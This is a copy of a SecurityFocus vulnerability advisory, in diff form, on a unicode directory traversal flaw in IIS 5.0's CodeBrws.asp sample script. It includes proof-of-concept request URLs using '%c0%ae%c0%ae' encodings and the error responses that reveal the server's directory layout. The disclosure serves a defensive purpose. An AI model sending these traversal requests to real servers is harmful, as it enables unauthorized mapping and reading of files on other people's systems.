@@ -1,0 +1,19 @@
+source: http://www.securityfocus.com/bid/4525/info
+
+Microsoft IIS 5.0 ships with a sample script that may be used to view the source code of other scripts in the sample scripts (/IISSAMPLES) directory. However, this script (CodeBrws.asp) does not adequately filter unicode representations of directory traversals. For example, an attacker can break out of the sample script directory by substituting '%c0%ae%c0%ae' for '..' in a dot-dot-slash directory traversal attack.
+
+It has been demonstrated that this issue may be exploited to map out the directory structure of the filesystem on a host running the vulnerable script.
+
+http://target/iissamples/sdk/asp/docs/CodeBrws.asp?Source=/IISSAMPLES/%c0%ae%c0%ae/default.asp
+
+The following example was also provided to demonstrate that the directory structure may be mapped out using this vulnerability:
+
+Request:
+http://target/IISSamples/sdk/asp/docs/CodeBrws.asp?Source=/IISSAMPLES/%c0%ae%c0%ae/%c0%ae%c0%ae/bogus_directory/nonexistent.asp
+
+Response: Microsoft VBScript runtime (0x800A004C) Path not found
+
+Request:
+http://target/IISSamples/sdk/asp/docs/CodeBrws.asp?Source=/IISSAMPLES/%c0%ae%c0%ae/%c0%ae%c0%ae/oracle/nonexistant.asp
+
+Response: Microsoft VBScript runtime (0x800A0035) File not found 
